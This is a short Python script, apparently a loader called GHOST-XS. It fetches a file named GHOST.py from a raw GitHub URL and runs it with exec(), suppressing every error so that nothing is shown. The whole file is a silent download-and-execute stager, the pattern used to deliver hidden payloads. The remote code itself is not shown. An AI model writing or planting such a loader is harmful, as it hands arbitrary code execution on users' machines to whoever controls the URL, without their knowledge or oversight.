#!/usr/bin/env python
# GHOST-XS UNIVERSAL LOADER
# Works with ALL Python versions (3.x, including 3.14+)

import urllib.request
import sys

# Your main script URL - VERIFIED WORKING
MAIN_URL = "https://raw.githubusercontent.com/Ghostxs90/External-basic-streamer-/main/GHOST.py"

try:
    # Simple, universal request - works with ALL Python versions
    response = urllib.request.urlopen(MAIN_URL, timeout=15)
    script_content = response.read().decode('utf-8')
    
    # Execute in current namespace
    exec(script_content)
    
except Exception:
    # Silent fail - absolutely no output, no windows, nothing
    pass
